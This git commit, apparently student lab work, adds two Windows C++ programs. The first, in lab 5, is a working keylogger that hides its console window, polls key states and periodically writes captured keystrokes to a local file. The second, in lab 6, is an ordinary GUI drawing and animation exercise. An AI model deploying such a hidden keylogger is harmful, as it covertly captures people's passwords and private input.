709e1b8c4001784a03468249a431c3b90a9c0613
razmarrus <mrazumeyev@gmail.com>
2019-11-21 22:05:09 +0300

    5 and 6 labs

---
+++ 5/KeyLogger/KeyLogger/KeyLogger.cpp
@@ -0,0 +1,158 @@
+﻿// KeyLogger.cpp : Этот файл содержит функцию "main". Здесь начинается и заканчивается выполнение программы.
+//
+
+#include <iostream>
+#define _WIN32_WINNT 0x0500
+#include <Windows.h>
+#include <string>
+#include <stdlib.h>
+#include <stdio.h>
+#include <iostream>
+#include <fstream>
+#include <ctime>
+#include <chrono>
+
+
+
+using namespace std;
+using namespace chrono;
+
+
+void LOG(string input, int &counter, char* &str) {
+	int len = input.length();
+	for (int i = 0; i < len; i++)
+	{
+		str[counter] = input[i];
+		counter++;
+	}
+	/*fstream LogFile;
+	LogFile.open("dat.txt", fstream::app);
+	if (LogFile.is_open()) {
+		LogFile << input;
+		LogFile.close();
+	}*/
+}
+
+
+bool SpecialKeys(int S_Key, int &counter, char* &str) {
+	switch (S_Key) {
+	case VK_SPACE:
+		cout << " ";
+		LOG(" ", counter, str);
+		return true;
+	case VK_RETURN:
+		cout << "\n";
+		LOG("\n", counter, str);
+		return true;
+	case '¾':
+		cout << ".";
+		LOG(".", counter, str);
+		return true;
+	case VK_SHIFT:
+		cout << "#SHIFT#";
+		LOG("#SHIFT#", counter, str);
+		return true;
+	case VK_BACK:
+		cout << "\b";
+		LOG("\b", counter, str);
+		return true;
+	case VK_RBUTTON:
+		cout << "#R_CLICK#";
+		LOG("#R_CLICK#", counter, str);
+		return true;
+	case VK_CAPITAL:
+		cout << "#CAPS_LOCK#";
+		LOG("#CAPS_LCOK", counter, str);
+		return true;
+	case VK_TAB:
+		cout << "#TAB";
+		LOG("#TAB", counter, str);
+		return true;
+	case VK_UP:
+		cout << "#UP";
+		LOG("#UP_ARROW_KEY", counter, str);
+		return true;
+	case VK_DOWN:
+		cout << "#DOWN";
+		LOG("#DOWN_ARROW_KEY", counter, str);
+		return true;
+	case VK_LEFT:
+		cout << "#LEFT";
+		LOG("#LEFT_ARROW_KEY", counter, str);
+		return true;
+	case VK_RIGHT:
+		cout << "#RIGHT";
+		LOG("#RIGHT_ARROW_KEY", counter, str);
+		return true;
+	case VK_CONTROL:
+		cout << "#CONTROL";
+		LOG("#CONTROL", counter, str);
+		return true;
+	case VK_MENU:
+		cout << "#ALT";
+		LOG("#ALT", counter, str);
+		return true;
+	default:
+		return false;
+	}
+}
+
+
+
+int main()
+{
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	//std::cout << "hey";
+	char KEY = 'x';
+	int n = 30, counter = 0;
+	char* str = new char[n];
+	auto start = high_resolution_clock::now();
+	bool flag = true;
+	while (true) {
+
+		for (int KEY = 8; KEY <= 190; KEY++)
+		{
+			auto end = high_resolution_clock::now();
+
+			if (duration_cast<seconds>(end - start).count() % 10 == 0 && flag)
+			{
+				flag = false;
+				if (counter > 0) {
+
+					fstream LogFile;
+					LogFile.open("dat.txt", fstream::app);
+
+					if (LogFile.is_open()) {
+						for (int i = 0; i <= counter; i++)
+						{
+							LogFile << str[i];
+							cout << str[i];
+						}
+						//LogFile << char(KEY);				counter = 0;
+					}
+					counter = 0;
+					LogFile.close();
+					//cout << "saved\n";
+				}
+				//else
+				//	cout << "not saved\n";фывайцу
+			}
+
+			if (duration_cast<seconds>(end - start).count() % 10 == 1 && !flag)
+				flag = true;
+
+			if (GetAsyncKeyState(KEY) == -32767) {
+				//cout << "2";
+				if (SpecialKeys(KEY, counter, str) == false) {
+					
+					str[counter] = char(KEY);
+					//cout << str[counter];
+					counter++;
+
+				}
+			}
+		}
+	}
+	system("pause");
+	return 0;
+}
---
+++ 6/WindowsProject1/WindowsProject1/WindowsProject1.cpp
@@ -0,0 +1,324 @@
+﻿// WindowsProject1.cpp : ���������� ����� ����� ��� ����������.
+//
+
+#include "stdafx.h"
+#include "WindowsProject1.h"
+
+#define MAX_LOADSTRING 100
+
+// ���������� ����������:
+HINSTANCE hInst;                                // ������� ���������
+WCHAR szTitle[MAX_LOADSTRING];                  // ����� ������ ���������
+WCHAR szWindowClass[MAX_LOADSTRING];            // ��� ������ �������� ����
+
+bool DrawingMode = true;
+bool MoveMode = false;
+bool RMode = false;
+
+int xLocation = 550, yLocation = 250, objectNumber = 15, currentIndex = 0;
+void Draw(HDC, int, int);
+int *XLocationsArray;
+int *YLocationsArray;
+
+// ��������� ���������� �������, ���������� � ���� ������ ����:
+ATOM                MyRegisterClass(HINSTANCE hInstance);
+BOOL                InitInstance(HINSTANCE, int);
+LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
+INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
+
+int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
+	_In_opt_ HINSTANCE hPrevInstance,
+	_In_ LPWSTR    lpCmdLine,
+	_In_ int       nCmdShow)
+{
+	UNREFERENCED_PARAMETER(hPrevInstance);
+	UNREFERENCED_PARAMETER(lpCmdLine);
+
+	// TODO: ���������� ��� �����.
+	XLocationsArray = new int[objectNumber];
+	YLocationsArray = new int[objectNumber];
+
+	LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
+	LoadStringW(hInstance, IDC_WINDOWSPROJECT1, szWindowClass, MAX_LOADSTRING);
+	MyRegisterClass(hInstance);
+
+
+	if (!InitInstance(hInstance, nCmdShow))
+	{
+		return FALSE;
+	}
+
+	HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_WINDOWSPROJECT1));
+
+	MSG msg;
+
+	// ���� ��������� ���������:
+	while (GetMessage(&msg, nullptr, 0, 0))
+	{
+		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
+		{
+			TranslateMessage(&msg);
+			DispatchMessage(&msg);
+		}
+	}
+
+	return (int)msg.wParam;
+}
+
+
+
+//
+//  �������: MyRegisterClass()
+//
+//  ����: ������������ ����� ����.
+//
+ATOM MyRegisterClass(HINSTANCE hInstance)
+{
+	WNDCLASSEXW wcex;
+
+	wcex.cbSize = sizeof(WNDCLASSEX);
+
+	wcex.style = CS_HREDRAW | CS_VREDRAW;
+	wcex.lpfnWndProc = WndProc;
+	wcex.cbClsExtra = 0;
+	wcex.cbWndExtra = 0;
+	wcex.hInstance = hInstance;
+	wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_WINDOWSPROJECT1));
+	wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
+	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
+	wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_WINDOWSPROJECT1);
+	wcex.lpszClassName = szWindowClass;
+	wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));
+
+	return RegisterClassExW(&wcex);
+}
+
+BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
+{
+	hInst = hInstance; 
+
+	HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
+		CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);
+	//HWND hWnd1 = CreateWindowEx(NULL, L"BUTTON", L"CLEAR", WS_CHILD | WS_VISIBLE, 0, 0, 200, 25, hWnd, HMENU(55), hInst, NULL);
+	HWND hWnd1 = CreateWindowEx(NULL, L"BUTTON", L"START", WS_CHILD | WS_VISIBLE, 200, 0, 200, 25, hWnd, HMENU(56), hInst, NULL);
+	HWND hWnd2 = CreateWindowEx(NULL, L"BUTTON", L"STOP", WS_CHILD | WS_VISIBLE, 400, 0, 200, 25, hWnd, HMENU(58), hInst, NULL);
+	HWND hWnd3 = CreateWindowEx(NULL, L"BUTTON", L"EXIT", WS_CHILD | WS_VISIBLE, 800, 0, 200, 25, hWnd, HMENU(57), hInst, NULL);
+
+
+
+
+	if (!hWnd)
+	{
+		return FALSE;
+	}
+
+	ShowWindow(hWnd, nCmdShow);
+	UpdateWindow(hWnd);
+
+	return TRUE;
+}
+
+
+void UpdateGraph(HWND hwnd, HDC dc, int xLocation, int yLocation)
+{
+	if (DrawingMode)
+	{
+		XLocationsArray[currentIndex] = xLocation;
+		YLocationsArray[currentIndex] = yLocation;
+		currentIndex++;
+		if (currentIndex == objectNumber)
+		{
+			objectNumber += 15;
+			XLocationsArray = (int*)realloc(XLocationsArray, objectNumber * sizeof(int));
+			YLocationsArray = (int*)realloc(YLocationsArray, objectNumber * sizeof(int));
+		}
+	}
+	for (int i = 0; i < currentIndex; i++)
+	{
+
+		//Rectangle(hdc, XLocationsArray[i] - 33, YLocationsArray[i] + 40, XLocationsArray[i] + 33, YLocationsArray[i] - 25);
+		//Rectangle(hdc, XLocationsArray[i] - 13, YLocationsArray[i] + 20, XLocationsArray[i] + 13, YLocationsArray[i] - 5);
+		//MoveToEx(hdc, XLocationsArray[i] - 30, YLocationsArray[i], NULL);
+
+
+		LPCWSTR message = L"My First Window";
+		RECT rc;
+		rc.left = (XLocationsArray[i] - 75);
+		rc.top = (YLocationsArray[i] + 20);
+		rc.right = XLocationsArray[i] + 75;
+		rc.bottom = YLocationsArray[i] - 5;
+		//GetClientRect(hwnd, &rc);
+		DrawText(dc, message, -1, &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+	}
+}
+
+
+
+LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+	switch (message)
+	{
+	case WM_CREATE:
+	{
+		ShowWindow(hWnd, SW_SHOWNORMAL);
+		UpdateWindow(hWnd);
+		break;
+	}
+	case WM_TIMER:
+	{
+		if (wParam == 1)
+		{
+			if (RMode)
+				XLocationsArray[currentIndex - 1] += 5;
+			else XLocationsArray[currentIndex - 1] -= 5;
+			if (XLocationsArray[currentIndex - 1] > 930 || XLocationsArray[currentIndex - 1] < 30)
+				KillTimer(hWnd, 1);
+			DrawingMode = false;
+			InvalidateRect(hWnd, NULL, true);
+		}
+		break;
+	}
+	case WM_LBUTTONDOWN:
+	{
+		DrawingMode = true;
+		//xLocation = 550;
+		xLocation = LOWORD(lParam);
+		//yLocation = 250; 
+		yLocation = HIWORD(lParam);
+		InvalidateRect(hWnd, NULL, true);
+		break;
+	}
+	case WM_COMMAND:
+	{
+		int wmId = LOWORD(wParam);
+	
+		switch (wmId)
+		{
+		case 55:
+		{
+			KillTimer(hWnd, 1);
+			MoveMode = false;
+			DrawingMode = false;
+			currentIndex = 0;
+			delete(XLocationsArray);
+			delete(YLocationsArray);
+			XLocationsArray = new int[objectNumber];
+			YLocationsArray = new int[objectNumber];
+			InvalidateRect(hWnd, NULL, true);
+			break;
+		}
+		case 56:
+		{
+			if (!MoveMode)
+			{
+				if (XLocationsArray[currentIndex - 1] <= 500)
+					RMode = true;
+				else RMode = false;
+				SetTimer(hWnd, 1, 50, NULL);
+				MoveMode = true;
+			}
+			/*else
+			{
+				KillTimer(hWnd, 1);
+				MoveMode = false;
+			}*/
+			break;
+		}
+		case 57:
+		{
+			DestroyWindow(hWnd);
+			break;
+		}
+		case 58:
+		{
+			if (MoveMode)
+			{
+				KillTimer(hWnd, 1);
+				MoveMode = false;
+			}
+			break;
+		}
+		case IDM_ABOUT:
+			DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
+			break;
+		case IDM_EXIT:
+			DestroyWindow(hWnd);
+			break;
+		default:
+			return DefWindowProc(hWnd, message, wParam, lParam);
+		}
+	}
+	break;
+	case WM_PAINT:
+	{
+		PAINTSTRUCT ps;
+		HDC hdc = BeginPaint(hWnd, &ps);
+		Draw(hdc, xLocation, yLocation);
+		UpdateGraph(hWnd, hdc, xLocation, yLocation);
+		// TODO: �������� ���� ����� ��� ����������, ������������ HDC...
+		EndPaint(hWnd, &ps);
+	}
+	break;
+	case WM_DESTROY:
+		PostQuitMessage(0);
+		KillTimer(hWnd, 1);
+		break;
+	default:
+		return DefWindowProc(hWnd, message, wParam, lParam);
+	}
+	return 0;
+}
+
+
+// ���������� ��������� ��� ���� "� ���������".
+INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
+{
+	UNREFERENCED_PARAMETER(lParam);
+	switch (message)
+	{
+	case WM_INITDIALOG:
+		return (INT_PTR)TRUE;
+
+	case WM_COMMAND:
+		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
+		{
+			EndDialog(hDlg, LOWORD(wParam));
+			return (INT_PTR)TRUE;
+		}
+		break;
+	}
+	return (INT_PTR)FALSE;
+}
+
+
+void Draw(HDC hdc, int xLocation, int yLocation)
+{
+	HPEN holdPen, hGreenPen;
+	hGreenPen = CreatePen(PS_SOLID, 2, RGB(0, 0, 255));
+	holdPen = (HPEN)SelectObject(hdc, hGreenPen);
+	HBRUSH holdBrush, hSkyBrush;
+	hSkyBrush = CreateSolidBrush(RGB(0, 204, 255));
+	holdBrush = (HBRUSH)SelectObject(hdc, hSkyBrush);
+	if (DrawingMode)
+	{
+		XLocationsArray[currentIndex] = xLocation;
+		YLocationsArray[currentIndex] = yLocation;
+		currentIndex++;
+		if (currentIndex == objectNumber)
+		{
+			objectNumber += 15;
+			XLocationsArray = (int*)realloc(XLocationsArray, objectNumber * sizeof(int));
+			YLocationsArray = (int*)realloc(YLocationsArray, objectNumber * sizeof(int));
+		}
+	}
+	for (int i = 0; i < currentIndex; i++)
+	{ 
+		
+		//Rectangle(hdc, XLocationsArray[i] - 33, YLocationsArray[i] + 40, XLocationsArray[i] + 33, YLocationsArray[i] - 25);
+		//Rectangle(hdc, XLocationsArray[i] - 13, YLocationsArray[i] + 20, XLocationsArray[i] + 13, YLocationsArray[i] - 5);
+		MoveToEx(hdc, XLocationsArray[i] - 30, YLocationsArray[i], NULL);
+	}
+	DrawingMode = false;
+	SelectObject(hdc, holdPen);
+	DeleteObject(hGreenPen);
+}
